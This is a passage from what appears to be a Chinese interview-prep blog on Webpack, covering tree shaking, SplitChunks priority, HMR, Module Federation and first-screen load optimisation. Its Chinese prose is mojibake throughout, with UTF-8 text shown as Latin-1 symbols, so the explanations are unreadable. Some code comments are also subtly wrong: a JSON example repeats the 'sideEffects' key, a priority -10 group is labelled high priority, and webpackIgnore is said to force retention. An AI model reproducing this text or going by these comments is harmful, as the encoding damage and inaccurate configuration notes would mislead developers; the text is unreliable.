â€˜productionâ€™ï¼‰</td><td align="left">Webpack è‡ªåŠ¨å¯ç”¨å‹ç¼©ä¸æ— å‰¯ä½œç”¨ä¼˜åŒ–</td><td align="left">æŸ¥çœ‹ optimization.usedExports</td></tr><tr><td align="left">3. æ— å‰¯ä½œç”¨æ ‡è®°</td><td align="left">é€šè¿‡ package.json çš„ sideEffects å£°æ˜</td><td align="left">åˆ†ææ„å»ºè¾“å‡ºæœªä½¿ç”¨å¯¼å‡º</td></tr><tr><td align="left">4. å·¥å…·é“¾æ”¯æŒ</td><td align="left">Babel ä¸è½¬æ¢ ES Moduleï¼ˆpreset-env éœ€è®¾ modules: falseï¼‰</td><td align="left">æ£€æŸ¥ç¼–è¯‘åä»£ç æ˜¯å¦ä¿ç•™ import</td></tr></tbody></table><p><strong>å‰¯ä½œç”¨ï¼ˆSide Effectsï¼‰å¤„ç†æœºåˆ¶</strong></p><p>(1) å…¨å±€å‰¯ä½œç”¨å£°æ˜</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-comment">// package.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// æ‰€æœ‰æ–‡ä»¶å‡æ— å‰¯ä½œç”¨</span><br>  <span class="hljs-attr">&quot;sideEffects&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>       <span class="hljs-comment">// æŒ‡å®šæœ‰å‰¯ä½œç”¨çš„æ–‡ä»¶</span><br>    <span class="hljs-string">&quot;*.css&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;src/polyfill.js&quot;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>(2) æ¨¡å—çº§æ ‡è®°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœ¨æ¨¡å—å†…æ ‡è®°</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> utils = <span class="hljs-comment">/*#__PURE__*/</span> <span class="hljs-function">() =&gt;</span> &#123; ... &#125;; <span class="hljs-comment">// æ ‡è®°çº¯å‡½æ•°</span><br><br><span class="hljs-comment">// æˆ–ä½¿ç”¨ magic comment</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackIgnore: true */</span> <span class="hljs-string">&#x27;analytics.js&#x27;</span>); <span class="hljs-comment">// å¼ºåˆ¶ä¿ç•™</span><br></code></pre></td></tr></table></figure><p>(3) Webpack é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">optimization</span>: &#123;<br>  <span class="hljs-attr">sideEffects</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¯ç”¨å…¨å±€å‰¯ä½œç”¨åˆ†æ</span><br>  <span class="hljs-attr">providedExports</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¯¼å‡ºåˆ†æ</span><br>  <span class="hljs-attr">usedExports</span>: <span class="hljs-literal">true</span>   <span class="hljs-comment">// æ ‡è®°æœªä½¿ç”¨å¯¼å‡º</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Tree Shaking å¤±æ•ˆçš„å…­å¤§åœºæ™¯ä¸è§£å†³æ–¹æ¡ˆ</strong></p><table><thead><tr><th align="left">å¤±æ•ˆåœºæ™¯</th><th align="left">åŸå› åˆ†æ</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">1. Babel è½¬æ¢ ESM</td><td align="left"><code>@babel/preset-env</code> é»˜è®¤è½¬æ¢ ES6 æ¨¡å—ä¸º CommonJS</td><td align="left">é…ç½® <code>presets: [[&#39;@babel/preset-env&#39;, &#123; modules: false &#125;]]</code></td></tr><tr><td align="left">2. ç¬¬ä¸‰æ–¹åº“æœªå£°æ˜å‰¯ä½œç”¨</td><td align="left">Lodash æœªæ ‡è®° <code>sideEffects: false</code></td><td align="left">æ‰‹åŠ¨æ·»åŠ é…ç½®ï¼špackage.json æˆ–ä½¿ç”¨ lodash-es</td></tr><tr><td align="left">3. CSS å¯¼å…¥è¢«è¯¯åˆ </td><td align="left"><code>import &#39;./styles.css&#39;</code> è¢«è§†ä¸ºæ— å¯¼å‡ºè¯­å¥</td><td align="left">åœ¨ sideEffects æ·»åŠ  [â€œ*.cssâ€]</td></tr><tr><td align="left">4. åŠ¨æ€è®¿é—®å¯¼å‡ºå±æ€§</td><td align="left"><code>obj[dynamicKey]</code> ä½¿å·¥å…·æ— æ³•é™æ€åˆ†æ</td><td align="left">æ”¹ä¸ºé™æ€è®¿é—®ï¼š<code>import &#123; named &#125; from &#39;lib&#39;</code></td></tr><tr><td align="left">5. ç«‹å³æ‰§è¡Œå‡½æ•°å‰¯ä½œç”¨</td><td align="left">IIFE ä¸­åŒ…å« DOM æ“ä½œç­‰å‰¯ä½œç”¨</td><td align="left">ä½¿ç”¨ <code>/*#__PURE__*/</code> æ ‡è®°æˆ–é‡æ„ä¸ºå£°æ˜å¼å‡½æ•°</td></tr><tr><td align="left">6. æ¨¡å—é‡å¯¼å‡ºé“¾æ¡æ–­è£‚</td><td align="left">ä¸­é—´æ¨¡å—æœªæ­£ç¡®è½¬å‘å¯¼å‡º</td><td align="left">ä½¿ç”¨ç»Ÿä¸€å‡ºå£æ–‡ä»¶ï¼š<code>export * from &#39;./module&#39;</code></td></tr></tbody></table><h3 id="8-1-2-SplitChunksé…ç½®é¡¹ä¼˜å…ˆçº§"><a href="#8-1-2-SplitChunksé…ç½®é¡¹ä¼˜å…ˆçº§" class="headerlink" title="8.1.2 SplitChunksé…ç½®é¡¹ä¼˜å…ˆçº§"></a>8.1.2 SplitChunksé…ç½®é¡¹ä¼˜å…ˆçº§</h3><p><strong>é…ç½®é¡¹ä¼˜å…ˆçº§æ€»è§ˆ</strong></p><pre class="mermaid">graph TD  A[å…¨å±€splitChunksé…ç½®] --> B[cacheGroupsé»˜è®¤ç»„]  A --> C[cacheGroupsè‡ªå®šä¹‰ç»„]  C --> D[ç»„å†…priorityå±æ€§]  D --> E[æ¨¡å—åŒ¹é…test/type]  E --> F[æ¨¡å—ä½“ç§¯minSizeç­‰]</pre><p>ä¼˜å…ˆçº§æ ¸å¿ƒåŸåˆ™ï¼š</p><ul><li>cacheGroups ä¼˜å…ˆçº§ &gt; å…¨å±€é…ç½®</li><li>priority æ•°å€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜</li><li>åŒä¸€ä¼˜å…ˆçº§ä¸‹åŒ¹é…é¡ºåºå†³å®š</li></ul><p><strong>é…ç½®ç»§æ‰¿å…³ç³»è¯¦è§£</strong></p><p>(1) å…¨å±€é…ç½® vs ç¼“å­˜ç»„é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å…¨å±€é…ç½®ï¼ˆä½ä¼˜å…ˆçº§ï¼‰</span><br><span class="hljs-attr">optimization</span>: &#123;<br>  <span class="hljs-attr">splitChunks</span>: &#123;<br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span>,<br>    <span class="hljs-attr">minSize</span>: <span class="hljs-number">20000</span>,<br>    <span class="hljs-attr">cacheGroups</span>: &#123;<br>      <span class="hljs-attr">vendors</span>: &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]/</span>, <span class="hljs-comment">// é«˜ä¼˜å…ˆçº§</span><br>        <span class="hljs-attr">priority</span>: -<span class="hljs-number">10</span>                   <span class="hljs-comment">// ä¼˜å…ˆçº§æ•°å€¼</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å‚æ•°ç»§æ‰¿è§„åˆ™</p><table><thead><tr><th align="left">é…ç½®é¡¹</th><th align="left">ç»§æ‰¿é€»è¾‘</th></tr></thead><tbody><tr><td align="left">chunks</td><td align="left">ç¼“å­˜ç»„å¯è¦†ç›–å…¨å±€è®¾ç½®</td></tr><tr><td align="left">minSize</td><td align="left">ç¼“å­˜ç»„æœªè®¾ç½®æ—¶ç»§æ‰¿å…¨å±€ï¼Œè®¾ç½®åè¦†ç›–</td></tr><tr><td align="left">maxAsyncRequests</td><td align="left">ç‹¬ç«‹ç”Ÿæ•ˆï¼ˆä¸ç»§æ‰¿ï¼‰ï¼Œéœ€åœ¨æ¯ç»„æ˜¾å¼è®¾ç½®</td></tr><tr><td align="left">name</td><td align="left">ç¼“å­˜ç»„æœªè®¾ç½®æ—¶ä½¿ç”¨å…¨å±€ filename æ¨¡æ¿</td></tr></tbody></table><p><strong>ç¼“å­˜ç»„ï¼ˆcacheGroupsï¼‰ç«äº‰æœºåˆ¶</strong></p><p>(1) æ¨¡å—åŒ¹é…æµç¨‹</p><pre class="mermaid">graph LR  æ¨¡å— --> åŒ¹é…ç»„A{testè§„åˆ™}   åŒ¹é…ç»„A -- æ˜¯ --> ä¼˜å…ˆçº§A[priority:10]  åŒ¹é…ç»„A -- å¦ --> åŒ¹é…ç»„B{testè§„åˆ™}  åŒ¹é…ç»„B -- æ˜¯ --> ä¼˜å…ˆçº§B[priority:20]  ä¼˜å…ˆçº§B -- æ›´é«˜ --> é€‰å®šç»„B  ä¼˜å…ˆçº§A -- æ›´é«˜ --> é€‰å®šç»„A  åŒ¹é…ç»„B -- å¦ --> é»˜è®¤ç»„[vendors/default]</pre><p>(2) åŒä¼˜å…ˆçº§ç«äº‰</p><p>å½“ä¸¤ä¸ªç»„ priority ç›¸åŒä¸”éƒ½åŒ¹é…æ¨¡å—æ—¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">cacheGroups</span>: &#123;<br>  <span class="hljs-attr">reactVendor</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](react|react-dom)[\\/]/</span>,<br>    <span class="hljs-attr">priority</span>: <span class="hljs-number">20</span><br>  &#125;,<br>  <span class="hljs-attr">utilsVendor</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](lodash|moment)[\\/]/</span>,<br>    <span class="hljs-attr">priority</span>: <span class="hljs-number">20</span> <span class="hljs-comment">// ç›¸åŒä¼˜å…ˆçº§</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†³ç­–é€»è¾‘ï¼š</p><ul><li>å…ˆæ£€æŸ¥ reactVendorï¼ˆé…ç½®é¡ºåºåœ¨å‰ï¼‰</li><li>è‹¥åŒ¹é…åˆ™å½’å…¥è¯¥ç»„ï¼Œä¸å†æ£€æŸ¥åç»­ç»„</li></ul><h3 id="8-1-3-HMRå·¥ä½œæµç¨‹ï¼ˆWebSocket-â†’-HotModuleReplacementPluginï¼‰"><a href="#8-1-3-HMRå·¥ä½œæµç¨‹ï¼ˆWebSocket-â†’-HotModuleReplacementPluginï¼‰" class="headerlink" title="8.1.3 HMRå·¥ä½œæµç¨‹ï¼ˆWebSocket â†’ HotModuleReplacementPluginï¼‰"></a>8.1.3 HMRå·¥ä½œæµç¨‹ï¼ˆWebSocket â†’ HotModuleReplacementPluginï¼‰</h3><pre class="mermaid">sequenceDiagram  Browser->>DevServer: 1. å»ºç«‹ WebSocket è¿æ¥  Note over DevServer: æ–‡ä»¶ä¿®æ”¹  DevServer->>Compiler: 2. è§¦å‘å¢é‡ç¼–è¯‘  Compiler->>DevServer: 3. ç”Ÿæˆ Hash å’Œ Manifest  DevServer->>Browser: 4. æ¨é€ hash æ¶ˆæ¯ (socket.send)  Browser->>Runtime: 5. å‘èµ· JSONP è¯·æ±‚æ›´æ–°æ¨¡å—  Runtime->>Browser: 6. æ‰§è¡Œæ¨¡å—æ›¿æ¢ (applyUpdate)  Browser->>HMR API: 7. è§¦å‘ module.hot.accept å›è°ƒ</pre><h2 id="8-2-åœºæ™¯è®¾è®¡é¢˜"><a href="#8-2-åœºæ™¯è®¾è®¡é¢˜" class="headerlink" title="8.2 åœºæ™¯è®¾è®¡é¢˜"></a>8.2 åœºæ™¯è®¾è®¡é¢˜</h2><h3 id="8-2-1-â€œå¦‚ä½•å®ç°ç§’çº§æ„å»ºçš„å¾®å‰ç«¯é¡¹ç›®ï¼Ÿâ€"><a href="#8-2-1-â€œå¦‚ä½•å®ç°ç§’çº§æ„å»ºçš„å¾®å‰ç«¯é¡¹ç›®ï¼Ÿâ€" class="headerlink" title="8.2.1 â€œå¦‚ä½•å®ç°ç§’çº§æ„å»ºçš„å¾®å‰ç«¯é¡¹ç›®ï¼Ÿâ€"></a>8.2.1 â€œå¦‚ä½•å®ç°ç§’çº§æ„å»ºçš„å¾®å‰ç«¯é¡¹ç›®ï¼Ÿâ€</h3><p><strong>æŒä¹…åŒ–ç¼“å­˜ä¼˜åŒ–</strong></p><p>(1) Webpack 5 æ–‡ä»¶ç³»ç»Ÿç¼“å­˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-attr">cache</span>: &#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;filesystem&#x27;</span>, <span class="hljs-comment">// å¯ç”¨æŒä¹…åŒ–ç¼“å­˜</span><br>  <span class="hljs-attr">cacheDirectory</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;.cache/webpack&#x27;</span>),<br>  <span class="hljs-attr">buildDependencies</span>: &#123; <span class="hljs-attr">config</span>: [__filename] &#125; <span class="hljs-comment">// é…ç½®æ–‡ä»¶å˜æ›´æ—¶è‡ªåŠ¨å¤±æ•ˆç¼“å­˜</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ•ˆæœï¼šäºŒæ¬¡æ„å»ºæ—¶é—´å‡å°‘70%ä»¥ä¸Šï¼ˆé¦–å±æ„å»ºä»12sâ†’3sï¼‰ã€‚</li><li>åŸç†ï¼šå°†ç¼–è¯‘ç»“æœï¼ˆæ¨¡å—ASTã€ä¾èµ–å›¾ï¼‰å†™å…¥ç£ç›˜ï¼Œè·³è¿‡é‡å¤è§£æã€‚</li></ul><p>(2) å†…å®¹å“ˆå¸Œç²¾å‡†ç¼“å­˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;[name].[contenthash:8].js&#x27;</span>, <span class="hljs-comment">// åŸºäºå†…å®¹å˜åŒ–çš„å“ˆå¸Œ</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä»…ä¿®æ”¹çš„æ–‡ä»¶è§¦å‘é‡æ–°æ„å»ºï¼Œæœªå˜æ›´æ¨¡å—ç›´æ¥å¤ç”¨ç¼“å­˜ã€‚</li></ul><p><strong>å¢é‡ç¼–è¯‘ä¸æŒ‰éœ€åŠ è½½</strong></p><p>(1) åŠ¨æ€å…¥å£ï¼ˆDynamic Entryï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®è·¯ç”±åŠ¨æ€ç”ŸæˆEntry</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">dynamicEntries</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> pages = <span class="hljs-title function_">detectUserRoutes</span>(); <span class="hljs-comment">// åŠ¨æ€æ‰«æè·¯ç”±æ–‡ä»¶</span><br>  <span class="hljs-keyword">return</span> pages.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">entries, page</span>) =&gt;</span> &#123;<br>    entries[page.<span class="hljs-property">name</span>] = <span class="hljs-string">`./src/pages/<span class="hljs-subst">$&#123;page.path&#125;</span>.js`</span>;<br>    <span class="hljs-keyword">return</span> entries;<br>  &#125;, &#123;&#125;);<br>&#125;;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123; <span class="hljs-attr">entry</span>: dynamicEntries &#125;;<br></code></pre></td></tr></table></figure><ul><li>ä¼˜åŠ¿ï¼šä»…ç¼–è¯‘å½“å‰å¼€å‘æ¶‰åŠçš„è·¯ç”±æ¨¡å—ï¼Œé™ä½80%ç¼–è¯‘é‡ã€‚</li></ul><p>(2) æŒ‰éœ€åŠ è½½å­åº”ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»åº”ç”¨åŠ¨æ€åŠ è½½å­åº”ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">loadApp</span> = (<span class="hljs-params">appName</span>) =&gt; &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">`remoteApps/<span class="hljs-subst">$&#123;appName&#125;</span>/remoteEntry.js`</span>)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">remote</span> =&gt;</span> remote.<span class="hljs-title function_">init</span>(sharedScope));<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ¨¡å—è”é‚¦ï¼ˆModule Federationï¼‰æ·±åº¦ä¼˜åŒ–</strong></p><p>(1) å…±äº«ä¾èµ–ç­–ç•¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å­åº”ç”¨é…ç½®</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;productApp&#x27;</span>,<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;remoteEntry.js&#x27;</span>,<br>  <span class="hljs-attr">exposes</span>: &#123; <span class="hljs-string">&#x27;./ProductList&#x27;</span>: <span class="hljs-string">&#x27;./src/components/ProductList.jsx&#x27;</span> &#125;,<br>  <span class="hljs-attr">shared</span>: &#123;<br>    <span class="hljs-attr">react</span>: &#123; <span class="hljs-attr">singleton</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">eager</span>: <span class="hljs-literal">true</span> &#125;,<br>    <span class="hljs-string">&#x27;react-dom&#x27;</span>: &#123; <span class="hljs-attr">singleton</span>: <span class="hljs-literal">true</span> &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>å…³é”®å‚æ•°ï¼š</p><ul><li>singleton: trueï¼šå¼ºåˆ¶å•ä¾‹ï¼Œé¿å…é‡å¤åŠ è½½ã€‚</li><li>eager: trueï¼šä¸»åº”ç”¨å¯åŠ¨æ—¶é¢„åŠ è½½ï¼Œå‡å°‘è¿è¡Œæ—¶å»¶è¿Ÿã€‚</li></ul><p>(2) å¹¶è¡ŒåŠ è½½è¿œç¨‹æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨Promise.allå¹¶è¡ŒåŠ è½½</span><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;app1/Button&#x27;</span>),<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;app2/Table&#x27;</span>)<br>]).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">[Button, Table]</span>) =&gt;</span> <span class="hljs-title function_">renderApp</span>(<span class="hljs-title class_">Button</span>, <span class="hljs-title class_">Table</span>));<br></code></pre></td></tr></table></figure><ul><li>ç»“åˆHTTP&#x2F;2å¤šè·¯å¤ç”¨ï¼Œæå‡æ¨¡å—åŠ è½½æ•ˆç‡ã€‚</li></ul><p><strong>æ„å»ºæµç¨‹åŠ é€Ÿç­–ç•¥</strong></p><p>(1) ç¼©å°Loaderå¤„ç†èŒƒå›´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">rules</span>: [&#123;<br>  <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.jsx?$/</span>,<br>  <span class="hljs-attr">include</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src&#x27;</span>), <span class="hljs-comment">// é™å®šsrcç›®å½•</span><br>  <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/node_modules/</span>, <span class="hljs-comment">// æ’é™¤node_modules</span><br>  <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;babel-loader&#x27;</span>]<br>&#125;]<br></code></pre></td></tr></table></figure><ul><li>æ•ˆæœï¼šå‡å°‘50%æ–‡ä»¶ç¼–è¯‘é‡ã€‚</li></ul><p>(2) å¤šè¿›ç¨‹ç¼–è¯‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">use</span>: [<br>  &#123; <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;thread-loader&#x27;</span>, <span class="hljs-attr">options</span>: &#123; <span class="hljs-attr">workers</span>: <span class="hljs-number">4</span> &#125; &#125;, <span class="hljs-comment">// å¤šè¿›ç¨‹</span><br>  <span class="hljs-string">&#x27;babel-loader?cacheDirectory=true&#x27;</span> <span class="hljs-comment">// å¯ç”¨Babelç¼“å­˜</span><br>]<br></code></pre></td></tr></table></figure><ul><li>æ¨èå·¥å…·ï¼šthread-loader + cache-loaderã€‚</li></ul><p>(3) ä¼˜åŒ–æ¨¡å—æœç´¢è·¯å¾„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">resolve</span>: &#123;<br>  <span class="hljs-attr">modules</span>: [path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;node_modules&#x27;</span>)], <span class="hljs-comment">// é”å®šnode_modulesä½ç½®</span><br>  <span class="hljs-attr">alias</span>: &#123; <span class="hljs-string">&#x27;react&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;./vendor/react.min.js&#x27;</span>) &#125; <span class="hljs-comment">// åˆ«åç¼©çŸ­è·¯å¾„</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-2-2-â€œé¦–å±åŠ è½½æ…¢ï¼Œä»å“ªäº›ç»´åº¦ä¼˜åŒ–ï¼Ÿâ€"><a href="#8-2-2-â€œé¦–å±åŠ è½½æ…¢ï¼Œä»å“ªäº›ç»´åº¦ä¼˜åŒ–ï¼Ÿâ€" class="headerlink" title="8.2.2 â€œé¦–å±åŠ è½½æ…¢ï¼Œä»å“ªäº›ç»´åº¦ä¼˜åŒ–ï¼Ÿâ€"></a>8.2.2 â€œé¦–å±åŠ è½½æ…¢ï¼Œä»å“ªäº›ç»´åº¦ä¼˜åŒ–ï¼Ÿâ€</h3><p><strong>è¯Šæ–­ç“¶é¢ˆç‚¹</strong></p><table><thead><tr><th align="left">æŒ‡æ ‡</th><th align="left">åˆ†æå·¥å…·</th><th align="left">ä¼˜åŒ–æ–¹å‘</th></tr></thead><tbody><tr><td align="left">FCP (é¦–æ¬¡å†…å®¹ç»˜åˆ¶)</td><td align="left">Lighthouseã€WebPageTest</td><td align="left">èµ„æºåŠ è½½ã€é˜»å¡æ¸²æŸ“</td></tr><tr><td align="left">LCP (æœ€å¤§å†…å®¹ç»˜åˆ¶)</td><td align="left">Chrome DevTools</td><td align="left">å›¾ç‰‡&#x2F;å­—ä½“ã€æ¸²æŸ“é˜»å¡</td></tr><tr><td align="left">TTI (å¯äº¤äº’æ—¶é—´)</td><td align="left">SpeedCurve</td><td align="left">JSæ‰§è¡Œæ•ˆç‡ã€ä»£ç åˆ†å‰²</td></tr><tr><td align="left">Bundleä½“ç§¯</td><td align="left">Webpack Bundle Analyzer</td><td align="left">Tree Shakingã€ä»£ç åˆ†å‰²</td></tr></tbody></table><p><strong>èµ„æºåŠ è½½å±‚ä¼˜åŒ–</strong></p><p>(1) ä»£ç åˆ†å‰²ä¸æ‡’åŠ è½½</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±çº§åˆ†å‰² (Reactç¤ºä¾‹)</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./Home&#x27;</span>));<br></code></pre></td></tr></table></figure><p>ç­–ç•¥ï¼š</p><ul><li>ä¸»åŒ…ä»…ä¿ç•™æ ¸å¿ƒæ¡†æ¶ï¼ˆReact&#x2F;Vueï¼‰</li><li>è·¯ç”±ç»„ä»¶åŠ¨æ€åŠ è½½ + prefetch</li><li>éæ ¸å¿ƒåº“ï¼ˆå¦‚å›¾è¡¨åº“ï¼‰æŒ‰éœ€åŠ è½½</li></ul><p>(2) èµ„æºé¢„åŠ è½½ä¼˜åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- å…³é”®èµ„æºé¢„åŠ è½½ --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;main.css&quot; as=&quot;style&quot;&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;core.js&quot; as=&quot;script&quot;&gt;<br>&lt;!-- å­—ä½“é¢„åŠ è½½ --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;font.woff2&quot; as=&quot;font&quot; crossorigin&gt;<br></code></pre></td></tr></table></figure><p>(3) HTTP&#x2F;2æ¨é€ (Server Push)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx é…ç½®</span><br><span class="hljs-attribute">http2_push</span> /static/core.js; <br><span class="hljs-attribute">http2_push</span> /static/main.css;<br></code></pre></td></tr></table></figure><ul><li>é€‚ç”¨åœºæ™¯ï¼šå…³é”®é™æ€èµ„æºå…æ¡æ‰‹è¯·æ±‚</li></ul><p><strong>æ„å»ºè¾“å‡ºä¼˜åŒ–</strong></p><p>(1) Tree Shakingæ·±åº¦å¼ºåŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// package.json æ ‡è®°å‰¯ä½œç”¨</span><br>&#123;<br>  <span class="hljs-string">&quot;sideEffects&quot;</span>: [<span class="hljs-string">&quot;*.css&quot;</span>, <span class="hljs-string">&quot;src/polyfill.js&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>é¿å‘ï¼š</p><ul><li>Babeléœ€è®¾ modules: false 